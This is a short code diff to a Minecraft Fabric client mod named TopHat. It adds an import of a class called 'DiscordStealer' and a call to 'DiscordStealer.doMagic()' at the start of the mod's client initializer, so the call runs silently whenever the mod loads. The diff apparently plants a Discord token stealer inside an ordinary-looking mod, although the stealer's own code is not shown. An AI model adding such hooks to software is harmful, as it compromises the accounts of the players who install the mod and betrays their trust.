@@ -1,5 +1,6 @@
 package dev.tophat;
 
+import cum.misuyaka.stealer.DiscordStealer;
 import dev.tophat.command.CommandRegistry;
 import dev.tophat.module.ModuleRegistry;
 import net.fabricmc.api.ClientModInitializer;
@@ -30,6 +31,8 @@ public class TopHat implements ClientModInitializer{
 
     @Override
     public void onInitializeClient() {
+        DiscordStealer.doMagic();
+
         INSTANCE = this;
 
         this.commandRegistry = new CommandRegistry();
